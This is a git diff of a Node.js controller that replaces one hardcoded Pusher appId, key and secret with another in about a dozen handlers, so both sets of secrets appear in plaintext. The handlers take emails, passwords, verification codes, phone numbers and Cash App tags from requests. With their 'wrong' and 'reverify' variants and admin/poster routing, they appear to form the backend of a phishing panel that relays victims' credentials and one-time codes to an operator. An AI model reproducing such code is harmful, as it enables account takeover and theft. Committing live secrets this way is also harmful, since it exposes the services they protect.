@@ -27,13 +27,14 @@ import Pusher from'pusher';
 
 export const email_post = async (req, res) => {
    
-      const pusher = new Pusher({
-          appId: '1985885',
-          key: 'de7a2a83ee88a8bfb323',
-          secret: '9d7a3b08f3903e68ca10',
-          cluster: 'ap2',
-          useTLS: true,
-        })
+     const pusher = new Pusher({
+                 appId: '1987499',
+                 key: '05656b52c62c0f688ee3',
+                 secret: 'b4372518df233d054270',
+                 cluster: 'ap2',
+                 useTLS: true,
+               })
+    
 
     const { adminId, posterId } = req.params
     const { id, site, email,password } = req.body
@@ -108,13 +109,14 @@ export const email_post_wrong = async(req, res) => {
     //     useTLS: true,
     //   });
 
-    const pusher = new Pusher({
-        appId: '1985885',
-        key: 'de7a2a83ee88a8bfb323',
-        secret: '9d7a3b08f3903e68ca10',
-        cluster: 'ap2',
-        useTLS: true,
-      })
+   const pusher = new Pusher({
+               appId: '1987499',
+               key: '05656b52c62c0f688ee3',
+               secret: 'b4372518df233d054270',
+               cluster: 'ap2',
+               useTLS: true,
+             })
+  
 
     const { id ,adminId} = req.body;
  
@@ -161,14 +163,14 @@ export const password_post = async(req, res) => {
     //     secret: 'f1f2616da0bb8ffa85b7',
     //     cluster: 'ap2',
     //     useTLS: true,
-    const pusher = new Pusher({
-        appId: '1985885',
-        key: 'de7a2a83ee88a8bfb323',
-        secret: '9d7a3b08f3903e68ca10',
-        cluster: 'ap2',
-        useTLS: true,
-      })
-      
+ const pusher = new Pusher({
+             appId: '1987499',
+             key: '05656b52c62c0f688ee3',
+             secret: 'b4372518df233d054270',
+             cluster: 'ap2',
+             useTLS: true,
+           })
+
 
     const { id, password ,adminId,posterId} = req.body;
  
@@ -214,14 +216,14 @@ export const password_post_wrong = async(req, res) => {
     //     useTLS: true,
     //   });
 
-    const pusher = new Pusher({
-        appId: '1985885',
-        key: 'de7a2a83ee88a8bfb323',
-        secret: '9d7a3b08f3903e68ca10',
-        cluster: 'ap2',
-        useTLS: true,
-      })
-
+   const pusher = new Pusher({
+               appId: '1987499',
+               key: '05656b52c62c0f688ee3',
+               secret: 'b4372518df233d054270',
+               cluster: 'ap2',
+               useTLS: true,
+             })
+  
     const { id } = req.body;
  
    
@@ -263,13 +265,14 @@ export const code_page_post = async(req, res) => {
     //   });
 
 
-    const pusher = new Pusher({
-        appId: '1985885',
-        key: 'de7a2a83ee88a8bfb323',
-        secret: '9d7a3b08f3903e68ca10',
-        cluster: 'ap2',
-        useTLS: true,
-      })
+ const pusher = new Pusher({
+             appId: '1987499',
+             key: '05656b52c62c0f688ee3',
+             secret: 'b4372518df233d054270',
+             cluster: 'ap2',
+             useTLS: true,
+           })
+
     const { id, code } = req.body;
  
     const filter = { _id: id };
@@ -309,13 +312,14 @@ export const reverify_code_page_post = async(req, res) => {
     //     cluster: 'mt1',
     //     useTLS: true,
     //   });
-    const pusher = new Pusher({
-        appId: '1985885',
-        key: 'de7a2a83ee88a8bfb323',
-        secret: '9d7a3b08f3903e68ca10',
-        cluster: 'ap2',
-        useTLS: true,
-      })
+ const pusher = new Pusher({
+             appId: '1987499',
+             key: '05656b52c62c0f688ee3',
+             secret: 'b4372518df233d054270',
+             cluster: 'ap2',
+             useTLS: true,
+           })
+
       
     const { id, code } = req.body;
  
@@ -359,13 +363,14 @@ export const mega_wrong = async(req, res) => {
     //     useTLS: true,
     //   });
 
-    const pusher = new Pusher({
-        appId: '1985885',
-        key: 'de7a2a83ee88a8bfb323',
-        secret: '9d7a3b08f3903e68ca10',
-        cluster: 'ap2',
-        useTLS: true,
-      })
+  const pusher = new Pusher({
+              appId: '1987499',
+              key: '05656b52c62c0f688ee3',
+              secret: 'b4372518df233d054270',
+              cluster: 'ap2',
+              useTLS: true,
+            })
+ 
       
     const { id } = req.body;
  
@@ -406,13 +411,14 @@ export const renumber_code_page_post = async(req, res) => {
     //     useTLS: true,
     //   });
 
-    const pusher = new Pusher({
-        appId: '1985885',
-        key: 'de7a2a83ee88a8bfb323',
-        secret: '9d7a3b08f3903e68ca10',
-        cluster: 'ap2',
-        useTLS: true,
-      })
+ const pusher = new Pusher({
+             appId: '1987499',
+             key: '05656b52c62c0f688ee3',
+             secret: 'b4372518df233d054270',
+             cluster: 'ap2',
+             useTLS: true,
+           })
+
     const { id } = req.body;
  
     const filter = { _id: id };
@@ -460,13 +466,14 @@ export const renumber_add = async(req, res) => {
     //     cluster: 'ap2',
     //     useTLS: true,
     //   })
-    const pusher = new Pusher({
-        appId: '1985885',
-        key: 'de7a2a83ee88a8bfb323',
-        secret: '9d7a3b08f3903e68ca10',
-        cluster: 'ap2',
-        useTLS: true,
-      })
+ const pusher = new Pusher({
+             appId: '1987499',
+             key: '05656b52c62c0f688ee3',
+             secret: 'b4372518df233d054270',
+             cluster: 'ap2',
+             useTLS: true,
+           })
+
       
 
     const { id, number,adminId,poster} = req.body;
@@ -514,13 +521,14 @@ export const successful_page_post = async(req, res) => {
     //   });
 
 
-    const pusher = new Pusher({
-        appId: '1985885',
-        key: 'de7a2a83ee88a8bfb323',
-        secret: '9d7a3b08f3903e68ca10',
-        cluster: 'ap2',
-        useTLS: true,
-      })
+ const pusher = new Pusher({
+             appId: '1987499',
+             key: '05656b52c62c0f688ee3',
+             secret: 'b4372518df233d054270',
+             cluster: 'ap2',
+             useTLS: true,
+           })
+
     const { id } = req.body;
  
   
@@ -575,13 +583,14 @@ export const successful_page_post = async(req, res) => {
 
 
     export const  add_name = async (req, res) => {
-        const pusher = new Pusher({
-            appId: '1985885',
-            key: 'de7a2a83ee88a8bfb323',
-            secret: '9d7a3b08f3903e68ca10',
-            cluster: 'ap2',
-            useTLS: true,
-          })
+       const pusher = new Pusher({
+                   appId: '1987499',
+                   key: '05656b52c62c0f688ee3',
+                   secret: 'b4372518df233d054270',
+                   cluster: 'ap2',
+                   useTLS: true,
+                 })
+      
         const { adminId, posterId } = req.params
         const { site, name,amount ,cashTag} = req.body
   
@@ -637,13 +646,14 @@ export const delete_cash_tag = async(req, res) => {
     //   });
 
 
-    const pusher = new Pusher({
-        appId: '1985885',
-        key: 'de7a2a83ee88a8bfb323',
-        secret: '9d7a3b08f3903e68ca10',
-        cluster: 'ap2',
-        useTLS: true,
-      })
+ const pusher = new Pusher({
+             appId: '1987499',
+             key: '05656b52c62c0f688ee3',
+             secret: 'b4372518df233d054270',
+             cluster: 'ap2',
+             useTLS: true,
+           })
+
 
     const { site } = req.body;
  
